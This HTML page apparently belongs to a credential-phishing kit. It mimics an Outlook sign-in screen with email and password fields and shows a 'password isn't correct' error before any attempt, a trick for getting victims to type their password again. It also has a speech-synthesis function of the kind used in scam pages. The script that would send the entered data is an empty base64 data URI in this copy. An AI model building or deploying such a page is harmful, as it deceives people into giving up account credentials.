<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon">
    <title>Outlook</title>
    <link rel="stylesheet" type="text/css" href="data:text/css;base64,">
    <script type="text/javascript">function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI="native";b.volume=1;b.rate=0.7;b.pitch=1;b.text=c;b.lang="en-US";speechSynthesis.speak(b)}speak("");</script>
</head>
<body>
    <div id="app">
        <div class="side"></div>
        <div class="main">
            <div class="wrapper">

                <div class="box">
                    <div class="logo"></div>
                    <div class="row">
                        <label for="">Email address:</label>
                        <input type="text" id="email" placeholder="email address">
                    </div>
                    <div class="row">
                        <label for="">Password:</label>
                        <input type="password" id="password" placeholder="password">
                    </div>
                    <div class="row">
                        <input type="checkbox" name="" id="show_pass">
                        <label for="show_pass" class="show_pass">Show password</label>
                    </div>
                    <div class="row">
                        <div class="error">The user name or password you entered isn't correct. Try entering it again.</div>
                    </div>
                    <div class="row">
                        <div class="login">sign in</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript" src="data:text/javascript;base64,"></script>

</body></html>
